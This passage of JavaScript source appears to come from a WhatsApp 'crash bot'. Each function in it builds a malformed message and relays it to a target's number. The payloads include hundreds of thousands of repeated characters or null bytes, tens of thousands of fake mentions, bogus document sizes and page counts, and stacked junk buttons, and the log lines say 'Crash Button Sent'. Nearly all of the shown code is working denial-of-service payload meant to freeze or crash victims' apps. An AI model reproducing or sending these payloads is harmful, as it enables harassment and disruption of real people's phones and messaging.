          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await ziole.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function Carousel(target) {
    const msg = generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: `\0`
                        },
                        carouselMessage: {
                            cards: [
                                {
                                    header: {
                                        ...(await prepareWAMessageMedia(
                                            { image: { url: "https://img1.pixhost.to/images/6002/603809921_imgtmp.jpg" } }, 
                                            { upload: ziole.waUploadToServer }
                                        )),
                                        title: `\0`,
                                        gifPlayback: true,
                                        subtitle: '\0',
                                        hasMediaAttachment: true
                                    },
                                    body: {
                                        text: `𝐂𝐚𝐫𝐨𝐮𝐬𝐞𝐥 𝐂𝐫𝐚𝐬𝐡` + "ꦾ".repeat(120000)
                                    },
                                    footer: {
                                        text: "\0"
                                    },
                                    nativeFlowMessage: {
                                        buttons: [
                                            {
                                                name: "single_select",
                                                buttonParamsJson: JSON.stringify({
                                                    title: "😂۞⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻😂",
                                                    sections: []
                                                })
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(60000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`
                                            },
                                            {
                                                name: "call_permission_request",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "mpm",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: "{\"title\":\"🦠\",\"sections\":[{\"title\":\"🔥\",\"highlight_label\":\"💥\",\"rows\":[{\"header\":\"\",\"title\":\"💧\",\"id\":\"⚡\"},{\"header\":\"\",\"title\":\"💣\",\"id\":\"✨\"}]}]}"
                                            },
                                            {
                                                name: "quick_reply",
                                                buttonParamsJson: "{\"display_text\":\"Quick Crash Reply\",\"id\":\"📌\"}"
                                            },
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: "{\"display_text\":\"Developed\",\"url\":\"https://www.youtube.com/@tamainfinity\",\"merchant_url\":\"https://www.youtube.com/@tamainfinity\"}"
                                            },
                                            {
                                                name: "cta_call",
                                                buttonParamsJson: "{\"display_text\":\"Call Us Null\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_copy",
                                                buttonParamsJson: "{\"display_text\":\"Copy Crash Code\",\"id\":\"message\",\"copy_code\":\"#CRASHCODE9741\"}"
                                            },
                                            {
                                                name: "cta_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Set Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_cancel_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Cancel Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "address_message",
                                                buttonParamsJson: "{\"display_text\":\"Send Crash Address\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "send_location",
                                                buttonParamsJson: "\0"
                                            }
                                        ]
                                    }
                                }
                            ],
                            messageVersion: 1,
                        }
                    }
                }
            }
        },
        { quoted: m }
    );
    await ziole.relayMessage(target, msg.message, {
        messageId: msg.key.id,
    });
    console.log("Success! Crl Button Sent")
}

async function NativeC(target) {
  let NativeCore = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
          },
          body: {
            title: "👑",
            text: "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻-" + "᭄".repeat(9741),
            description: "💌",
            footer: "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻",
          },
          nativeFlowMessage: {
            buttons: [
              { name: "single_select", buttonParamsJson: "" },
              { name: "view_product", buttonParamsJson: "" },
              { name: "payment_method", buttonParamsJson: "" },
              { name: "call_permission_request", buttonParamsJson: "" },
              { name: "mpm", buttonParamsJson: "" },
              { name: "payment_info", buttonParamsJson: "" },
            ],
          },
        },
      },
    },
  };
  await ziole.relayMessage(target, NativeCore, {
    participant: { jid: target },
  });
  console.log("Success! Crash Button Sent")
}
    
async function CallGc(target) {
await ziole.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    scheduledCallCreationMessage: {
                        callType: "VIDEO",
                        scheduledTimestampMs: Date.now() + 9741,
                        title: " ⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻" + `𑲭𑲭`.repeat(100000) + `ꦾ`.repeat(50000),
                        inviteCode: 't.me/apex',
                    }
                }
            }
        }, {});
      }
      
async function InvisibleLoadFast(target) {
      try {
        let message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: {
                contextInfo: {
                  mentionedJid: [target],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target,
                  },
                },
                body: {
                  text: "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻" + "\u0000".repeat(900000),
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: "",
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                  ],
                },
              },
            },
          },
        };

        await ziole.relayMessage(target, message, {
          participant: { jid: target },
        });
      } catch (err) {
        console.log(err);
      }
    }
async function InvisiPayload(target) {
      let sections = [];

      for (let i = 0; i < 100000; i++) {
        let largeText = "💎⃢ ᴍ͜͡ᴀ͜͡ʏ͜͡ᴢ͜͡ ɪ͜͡s⃟͜͡ ʜ͜͡ᴇ͜͡ʀ͜͡ᴇ͜͡ ⃢↯🔥";

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let msg = generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: [target],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target,
                  },
                },
                body: proto.Message.InteractiveMessage.Body.create({
                  text: "💎⃢ ᴍ͜͡ᴀ͜͡ʏ͜͡ᴢ͜͡ ɪ͜͡s⃟͜͡ ʜ͜͡ᴇ͜͡ʀ͜͡ᴇ͜͡ ⃢↯🔥",
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                  subtitle: "Testing Immediate Force Close",
                  hasMediaAttachment: false, // No media to focus purely on data overload
                }),
                nativeFlowMessage:
                  proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                      {
                        name: "single_select",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "payment_method",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "call_permission_request",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "single_select",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                    ],
                  }),
              }),
            },
          },
        },
        { userJid: target }
      );

      await ziole.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id,
      });
    }
    
async function xatanicaldelayv2(isTarget, mention) {
  console.log(chalk.blue(`Delay Hard V2 To Target ${isTarget}`));
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await ziole.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function Nullvisible(target) {
            await ziole.relayMessage(target, {
            viewOnceMessage: {
            message: {
            interactiveResponseMessage: {
            body: {
            text: "visiblemoment",
            format: "DEFAULT"
                    },
            nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
            }
            }
            }
            }
            }, { participant: { jid: target}});
    
    console.log(chalk.yellow('NullVisibleAttackDeviceYou'));
}

async function delayMakerInvisible(target) {
let venomModsData = JSON.stringify({
status: true,
criador: "VenomMods",
resultado: {
type: "md",
ws: {
_events: {
"CB:ib,,dirty": ["Array"]
},
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
connCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: {
Object: "authData"
},
markOnlineOnconnCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: {
Object: "transactionOptsData"
},
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: {
Object: "appStateMacData"
},
mobile: true
}
}
}
});
let stanza = [{
attrs: {
biz_bot: "1"
},
tag: "bot"
}, {
attrs: {},
tag: "biz"
}];
let message = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 3.2,
isStatusBroadcast: true,
statusBroadcastJid: "status@broadcast",
badgeChat: {
unreadCount: 9999
}
},
forwardedNewsletterMessageInfo: {
newsletterJid: "proto@newsletter",
serverMessageId: 1,
newsletterName: `DELAY - 🩸${"MARKER - 🩸".repeat(10)}`,
contentType: 3,
accessibilityText: `𝐉𝚺͢𝐗𝐏𝐋𝚹𝐈𝐓-𝐗 - 🩸 ${"﹏".repeat(102002)}`
},
interactiveMessage: {
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: target
},
dataSharingContext: {
showMmDisclosure: true
},
participant: "0@s.whatsapp.net",
mentionedJid: ["13135550002@s.whatsapp.net"]
},
body: {
text: "" + "ꦽ".repeat(102002) + "".repeat(102002)
},
nativeFlowMessage: {
buttons: [{
name: "single_select",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_method",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "call_permission_request",
buttonParamsJson: venomModsData + "".repeat(9999),
voice_call: "call_galaxy"
}, {
name: "form_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_learn_more",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_transaction_details",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_fbpin_reset",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "catalog_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_info",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "review_order",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "send_location",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payments_care_csat",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "view_product",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_settings",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "address_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "automated_greeting_message_view_catalog",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "open_webview",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "message_with_link_status",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_status",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "galaxy_costum",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "extensions_message_v2",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "landline_call",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "mpm",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_copy",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_url",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "review_and_pay",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "galaxy_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_call",
buttonParamsJson: venomModsData + "".repeat(9999)
}]
}
}
},
additionalNodes: stanza,
stanzaId: `stanza_${Date.now()}`
}
}
await ziole.relayMessage(target, message, {
participant: {
jid: target
}
});
}  
async function MSGSPAM(target) {
    let Msg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: ["13135550002@s.whastapp.net"],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "ᴍ͜͡ᴀ͜͡ʏ͜͡ᴢ͜͡ ɪ͜͡s⃟͜͡ ʜ͜͡ᴇ͜͡ʀ͜͡ᴇ͜͡",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await ziole.relayMessage(target, Msg, {
      participant: { jid: target },
    })
  }
  
async function DocFc(target) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "💎⃢ ᴍ͜͡ᴀ͜͡ʏ͜͡ᴢ͜͡ ɪ͜͡s⃟͜͡ ʜ͜͡ᴇ͜͡ʀ͜͡ᴇ͜͡ ⃢↯🔥" + "ꦾ".repeat(4500),
listType: 2,
singleSelectReply: {
    selectedRowId: "🔪"
},
contextInfo: {
stanzaId: ziole.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "💎⃢ ᴍ͜͡ᴀ͜͡ʏ͜͡ᴢ͜͡ ɪ͜͡s⃟͜͡ ʜ͜͡ᴇ͜͡ʀ͜͡ᴇ͜͡ ⃢↯🔥",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "Wanna Die ? Huh !"
                    },
                    contentText: "I Wanna Die With You \"😮‍💨\"",
                    footerText: "© 𝑫𝒂𝒑𝒛𝒚",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
entryPointConversionSource: "wangcap",
entryPointConversionApp: "wangcap",
actionLink: {
url: "t.me/ziole_Offc",
buttonTitle: "trash"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "Mahiru",
parentGroupJid: "combine",
trustBannerType: "unexpected",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "𑲭𑲭 𝑫𝒂𝒑𝒛𝒚 𝐕𝟏 ~ \"Dev\" ⚔️ ",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© Agler Forger",
sourceUrl: "se me?",
sourceId: "Agler Forger",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "burst",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "trash"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363415983819549@newsletter",
serverMessageId: 1,
newsletterName: `Crash Sletter ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "crash"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "INITIATED_BY_USER"
},
messageContextInfo: {
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
}),
},
}
}
}

await ziole.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
console.log("")
}

async function NewIos(target, Ptcp = true) {
ziole.relayMessage(
    target,
    {
        extendedTextMessage: {
            text: `𑲭𑲭💎⃢ ⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻↯🔥 ${'ꦾ'.repeat(103000)} ${'@13135550002'.repeat(25000)}`,
            contextInfo: {
                mentionedJid: [
                    "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 15000 }, () => `13135550002${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                ],
                stanzaId: "1234567890ABCDEF",
                participant: "13135550002@s.whatsapp.net",
                quotedMessage: {
                    callLogMesssage: {
                        isVideo: true,
                        callOutcome: "1",
                        durationSecs: "0",
                        callType: "REGULAR",
                        participants: [
                            {
                                jid: "13135550002@s.whatsapp.net",
                                callOutcome: "1"
                            }
                        ]
                    }
                },
                remoteJid: "13135550002@s.whastapp.net",
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 99999999,
                isForwarded: true,
                quotedAd: {
                    advertiserName: "Example Advertiser",
                    mediaType: "IMAGE",
                    caption: "This is an ad caption"
                },
                placeholderKey: {
                    remoteJid: "13135550002@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                    title: "💎⃢ ⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻ ⃢↯🔥",
                    body: `Ai To Crash ${'\0'.repeat(200)}`,
                    mediaType: "VIDEO",
                    renderLargerThumbnail: true,
                    previewType: "VIDEO",
                    sourceType: "x",
                    sourceId: "x",
                    sourceUrl: "https://www.facebook.com/WhastApp",
                    mediaUrl: "https://www.facebook.com/WhastApp",
                    containsAutoReply: true,
                    showAdAttribution: true,
                    ctwaClid: "ctwa_clid_example",
                    ref: "ref_example"
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                    url: "https://www.facebook.com/WhatsApp"
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "13135550002@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                    utmSource: "utm_source_example",
                    utmCampaign: "utm_campaign_example"
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "13135550002@newsletter",
                    serverMessageId: 1,
                    newsletterName: "Meta Ai",
                    contentType: "UPDATE",
                    accessibilityText: "Meta Ai"
                },
                businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                smbriyuCampaignId: "smb_riyu_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                    showMmDisclosure: true
                }
            }
        }
    },
    Ptcp
        ? {
              participant: {
                  jid: target
              }
          }
        : {}
       
);
console.log("")
}

async function OverloadCursor(target, ptcp = true) {
  const virtex = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];
  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title:
            "💎⃢ ⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻ ⃢↯🔥" + "ꦽ".repeat(16999),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🎭",
          },
          contextInfo: {
            virtexId: ziole.generateMessageTag(),
            participant: "13135550002@s.whatsapp.net",
            mentionedJid: ["13135550002@s.whatsapp.net"],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻" + "\u0000".repeat(97770),
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath:
                    "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                },
                hasMediaAttachment: true,
                contentText: 'Hallo"',
                footerText: "💎⃢ ᴍ͜͡ᴀ͜͡ʏ͜͡ᴢ͜͡ ɪ͜͡s⃟͜͡ ʜ͜͡ᴇ͜͡ʀ͜͡ᴇ͜͡ ⃢↯🔥",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(170000),
                    buttonText: {
                      displayText: "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "𝑫𝒂𝒑𝒛𝒚" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                ],
                viewOnce: true,
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "13135550002@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            entryPointConversionSource: "❤️",
            entryPointConversionApp: "💛",
            actionLink: {
              url: "t.me/ziole_Offc",
              buttonTitle: "💎⃢ ᴍ͜͡ᴀ͜͡ʏ͜͡ᴢ͜͡ ɪ͜͡s⃟͜͡ ʜ͜͡ᴇ͜͡ʀ͜͡ᴇ͜͡ ⃢↯🔥",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "😼",
            parentGroupJid: "😽",
            trustBannerType: "😾",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {},
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363415983819549@newsletter",
              serverMessageId: 1,
              newsletterName: `@13135550002${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "@13135550002".repeat(2999),
        },
        messageContextInfo: {
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
